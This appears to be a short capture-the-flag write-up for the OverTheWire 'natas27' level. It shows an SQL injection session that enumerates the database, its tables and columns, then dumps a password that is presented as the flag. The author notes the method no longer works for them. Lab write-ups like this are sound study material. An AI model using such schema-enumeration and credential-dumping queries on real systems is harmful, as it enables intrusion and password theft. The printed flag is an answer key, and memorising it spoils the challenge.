---
layout: default
title: natas27
---

Need to write, it used to work for me but i don't manage to make it now...
you can have a look on this script.
```python
{% include_relative scripts/level27.py %}
```

```
Enter SQL query (without 'union all'): select database()
[+] Query Results:
  - natas28
Enter SQL query (without 'union all'): select table_name from information_schema.tables where table_schema=0x6e617461733238
[+] Query Results:
  - jokes
  - users
Enter SQL query (without 'union all'): select column_name from information_schema.columns where table_name=0x7573657273
[+] Query Results:
  - username
  - password
Enter SQL query (without 'union all'): select password from users
[+] Query Results:
  - 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```

**Flag:** ***`31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`*** 